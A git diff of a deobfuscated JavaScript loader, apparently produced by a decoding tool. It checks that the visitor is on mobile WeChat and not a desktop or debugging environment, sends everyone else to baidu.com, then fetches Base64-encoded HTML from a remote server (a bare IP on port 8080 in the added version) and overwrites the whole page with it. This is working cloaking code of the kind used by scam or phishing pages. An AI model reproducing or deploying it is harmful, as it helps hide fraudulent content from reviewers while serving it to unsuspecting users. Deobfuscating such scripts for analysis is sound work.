@@ -1,34 +1,36 @@
-//Tue Aug 27 2024 11:33:41 GMT+0000 (Coordinated Universal Time)
+//Mon Nov 04 2024 09:53:19 GMT+0000 (Coordinated Universal Time)
 //Base:https://github.com/echo094/decode-js
 //Modify:https://github.com/smallfawn/decode_action
-function error() {
-  window.location.href = "https://www.baidu.com";
-  throw new Error("error");
+var ua = navigator.userAgent.toLowerCase(),
+  isj = navigator.platform.toLowerCase();
+function getLw() {
+  var _0x26801d = new RegExp("#", "g"),
+    _0x52c2ce = top.location.search + top.location.hash.replace(_0x26801d, "&"),
+    _0x37820d = new RegExp("(^|&|/?)lw=([^&#]*)(&|$|#)", "i"),
+    _0x1704b = _0x52c2ce.substr(1).match(_0x37820d),
+    _0x51b136;
+  try {
+    _0x51b136 = window.atob(_0x1704b[2]);
+  } catch (_0x3261e7) {
+    location.href = "http://www.baidu.com";
+  }
+  return _0x51b136.split(",");
 }
-function host() {
-  return "https://ncnm.cn";
-}
-function checkBrowser() {
-  var _0x2c2709 = navigator.userAgent.toLowerCase(),
-    _0x4d9df5 = navigator.platform.toLowerCase();
-  return _0x4d9df5.indexOf("win") < 0 && _0x4d9df5.indexOf("mac") < 0 && _0x2c2709.indexOf("wxdebugger") < 0 && _0x2c2709.indexOf("wechatdevtools") < 0 && _0x2c2709.indexOf("windowswechat") < 0 && _0x2c2709.indexOf("micromessenger") > 0;
-}
-!checkBrowser() && error();
-function loadPage() {
-  var _0x14dfee = new XMLHttpRequest();
-  _0x14dfee.open("GET", host() + "/api/info?u=" + Base64.encode(window.location.href), false);
-  _0x14dfee.onreadystatechange = function () {
-    if (this.status === 200 && this.readyState === 4) {
-      document.getElementById("loading").remove();
-      var _0x317658 = document.open("text/html", "replace");
-      _0x317658.write(Base64.decode(_0x14dfee.responseText.substr(5)));
-      _0x317658.close();
-    } else {
-      if (this.status === 404) {
-        error();
-      }
-    }
+if (isj.indexOf("win") < 0 && isj.indexOf("mac") < 0 && ua.indexOf("wxdebugger") < 0 && ua.indexOf("wechatdevtools") < 0 && ua.indexOf("windowswechat") < 0 && ua.match(/MicroMessenger/i) == "micromessenger") {
+  var lw = getLw(),
+    url = "http://43.139.29.225:8080/api/a/" + lw[1];
+  function render() {
+    html = Base64.decode(html.substr(3));
+    var _0x4eab2f = document.open("text/html", "replace");
+    _0x4eab2f.write(html);
+    _0x4eab2f.close();
+    document.getElementById("loading").style.display = "none";
+  }
+  var html = null,
+    xhr = new XMLHttpRequest();
+  xhr.open("GET", url, false);
+  xhr.onreadystatechange = function () {
+    if (this.status == 200 && this.readyState == 4) html = xhr.responseText, render();else this.status == 404 && alert("网络异常！");
   };
-  _0x14dfee.send();
-}
-loadPage();
+  xhr.send();
+} else location.href = "http://www.baidu.com";
